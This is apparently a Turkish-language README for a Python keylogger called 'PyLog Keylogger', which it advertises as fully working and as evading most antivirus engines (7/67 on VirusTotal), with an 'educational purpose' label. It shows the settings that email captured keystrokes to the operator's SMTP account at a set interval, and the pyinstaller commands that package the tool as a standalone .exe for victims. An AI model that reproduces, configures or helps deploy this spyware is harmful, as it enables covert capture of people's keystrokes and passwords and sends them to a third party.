# PyLog Keylogger
Tamamen calisan Keylogger sistemi. VirusTotal yakalanma orani : 7/67!! Gelistirmeye aciktir.. Egitim amaciyla düzenlenmistir!

## Kullanim

Kodun icerisindeki bazi kisimlari lütfen kendinize göre düzenleyiniz:

```python
7  MAIL_USER = "MAIL ADDRESSINIZI GIRIN" 
8  MAIL_SIFRE = "MAIL SIFRENIZI GIRIN" 
9  MAIL_SMTP = "smtp.ethereal.email" #Ethereal Örnegidir
10 SMTP_PORT = 587 # Ethereal Portudur
11 RAPOR_SURE = 60 # loglarin mail ile atilma süresini düzenler
12 RAPOR_TIPI = "mail" # "mail" veya sadece kayit icin "dosya" tercih edilebilir!
```
Satirlardaki bilgileri kendi bilgileriniz ile düzenleyiniz! Buradaki PORT ve SMTP ethereal email servisinden örnektir! Eger baska bir mail kullanirsaniz bu bilgileri mail servis saglayiciniza uygun düzenleyiniz! 

SMS ile Cifte Authentication Güvenliginiz var ise Hata alirsiniz!!

## Kullanim

Py Installer yüklü degil ise :
```bash
pip install pyinstaller
```
Projenizi düzenlediginiz dosyanin icine CMD/Terminal ile giriniz:
```bash
pyinstaller proje.py --onefile
```
Komutu ile projenizi tek bir .exe olarak cikarabilirsiniz!

## Destek ve Gelistirme
Gelistirmedeki desteklerinden dolayi Koddunyam Adminlerinden:
Expert
Adminimize tesekkür ederiz!
Pull istekleri kabul edilir!!
## Lisans
Acik kaynakli koddur. Düzenleme yada yayinlamada lütfen Alintidir ibaresi kullaniniz!
